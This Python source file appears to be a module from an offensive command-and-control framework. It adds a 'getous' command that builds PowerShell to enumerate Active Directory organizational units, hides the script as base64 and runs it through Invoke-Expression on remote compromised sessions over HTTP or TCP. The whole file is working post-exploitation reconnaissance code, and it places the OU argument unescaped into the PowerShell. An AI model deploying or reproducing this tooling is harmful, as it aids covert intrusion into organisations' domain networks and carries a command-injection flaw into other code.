import argparse
import base64
import os
import sys

from core.gunnershell.commands.base import register, Command, connection_builder
from core.session_handlers import session_manager

# Command Execution Imports
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution as tcp_exec

from colorama import Style, Fore
brightgreen  = "\001" + Style.BRIGHT + Fore.GREEN  + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred    = "\001" + Style.BRIGHT + Fore.RED    + "\002"

@register("getous")
class GetOUsCommand(Command):
		"""List all OUs or dump properties for a single OU."""

		@property
		def help(self):
				return "getous [-o <ou>] [-d <domain>] [--dc-ip <ip>]"

		def execute(self, args):
				parser = argparse.ArgumentParser(prog="getous", add_help=False)
				parser.add_argument("-o","--ou",    dest="ou",     required=False, help="OU name to fetch AD properties for")
				parser.add_argument("-d","--domain",dest="domain", required=False, help="AD domain name (FQDN) or NetBIOS")
				parser.add_argument("--dc-ip",      dest="dc_ip",  required=False, help="IP address of the Domain Controller")

				try:
						opts = parser.parse_args(args)
				except SystemExit:
						print(brightyellow + self.help)
						return

				out = self.logic(
						sid    = self.gs.sid,
						ou     = opts.ou,
						domain = opts.domain,
						dc_ip  = opts.dc_ip,
						op_id  = self.op_id
				)

				if out:
						print(brightgreen + out if "[!]" not in out else out)
				else:
						print(brightred + "[!] No output")

		def logic(self, sid, ou=None, domain=None, dc_ip=None, op_id="console"):
			sess = session_manager.sessions.get(sid)
			if not sess:
					return brightred + "[!] Invalid session"
			transport = sess.transport.lower()

			# resolve target DC / domain exactly like getcomputers/getgroups
			target = dc_ip or domain or None

			if target:
					dns_preamble = connection_builder(dc_ip, domain)
					if dns_preamble == "ERROR":
							return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain correctly"

					server_arg = "-Server $nb"
					root_base   = "$ldapPath = \"LDAP://$nb\"; $root = ([ADSI] $ldapPath).defaultNamingContext"
			else:
				dns_preamble = ""
				server_arg   = ""
				root_base    = "$root = ([ADSI]\"LDAP://RootDSE\").defaultNamingContext"

			# build the PS block
			if ou:
				ps_body = f"""
{dns_preamble}
try {{
	if (Get-Command Get-ADOrganizationalUnit -ErrorAction SilentlyContinue) {{
			$orgprint = (Get-ADOrganizationalUnit -Identity '{ou}' {server_arg} -Properties * | Format-List *)
			if ($orgprint) {{ Write-Output $orgprint }}
			else {{ Write-Output "Nothing Found" }}
	}} else {{
			{root_base}
			$searcher = New-Object System.DirectoryServices.DirectorySearcher
			$searcher.SearchRoot = [ADSI]"LDAP://$root"
			$searcher.Filter     = "(&(objectCategory=organizationalUnit)(ou={ou}))"
			$res = $searcher.FindOne()
			if ($res) {{
				foreach ($p in $res.Properties.PropertyNames) {{
					$v = $res.Properties[$p][0]
					if ($v) {{ Write-Output "$p`: $v" }}
					else {{ Write-Output "Nothing Found" }}
				}}
			}}
	}}
}} catch {{
	# fallback: repeat LDAP block
	{root_base}
	$searcher = New-Object System.DirectoryServices.DirectorySearcher
	$searcher.SearchRoot = [ADSI]"LDAP://$root"
	$searcher.Filter     = "(&(objectCategory=organizationalUnit)(ou={ou}))"
	$res = $searcher.FindOne()
	if ($res) {{
		foreach ($p in $res.Properties.PropertyNames) {{
			$v = $res.Properties[$p][0]
			if ($v) {{ Write-Output "$p`: $v" }}
			else {{ Write-Output "Nothing Found" }}
		}}
	}}
}}
"""
			else:
				ps_body = f"""
{dns_preamble}
try {{
	if (Get-Command Get-ADOrganizationalUnit -ErrorAction SilentlyContinue) {{
			$ous = (Get-ADOrganizationalUnit -Filter * {server_arg} | Select-Object -ExpandProperty DistinguishedName)
			if ($ous) {{ Write-Output $ous }} else {{ Write-Output "Nothing Found" }}
	}} else {{
			{root_base}
			$searcher = New-Object System.DirectoryServices.DirectorySearcher("LDAP://$root", "(objectCategory=organizationalUnit)")
			$searcher.PageSize = 1000
			$results = $searcher.FindAll()
			foreach ($r in $results) {{
				$dn = $r.Properties["distinguishedName"][0]
				if ($dn) {{ Write-Output $dn }} else {{ Write-Output "Nothing Found" }}
			}}
	}}
}} catch {{
	# fallback again
	{root_base}
	$searcher = New-Object System.DirectoryServices.DirectorySearcher("LDAP://$root", "(objectCategory=organizationalUnit)")
	$searcher.PageSize = 1000
	$results = $searcher.FindAll()
	foreach ($r in $results) {{
		$dn = $r.Properties["distinguishedName"][0]
		if ($dn) {{ Write-Output $dn }} else {{ Write-Output "Nothing Found" }}
	}}
}}
"""

			# Base64‐encode & dispatch
			b64 = base64.b64encode(ps_body.encode('utf-16le')).decode()
			one_liner = (
					"$ps = [System.Text.Encoding]::Unicode"
					f".GetString([Convert]::FromBase64String(\"{b64}\")); "
					"Invoke-Expression $ps"
			)

			if transport in ("http", "https"):
					out = http_exec.run_command_http(sid, one_liner, op_id=op_id)
		
			elif transport in ("tcp", "tls"):
					out = tcp_exec.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)
		
			if out:
				if "Nothing Found" in out:
					return brightred + "[!] Didn't find any OUs!"

				elif "Failed to resolve DC!" in out:
					return brightred + "[!] Failed to resolve DC, use --dc-ip or --domain with the correct IP/domain"

				else:
					return out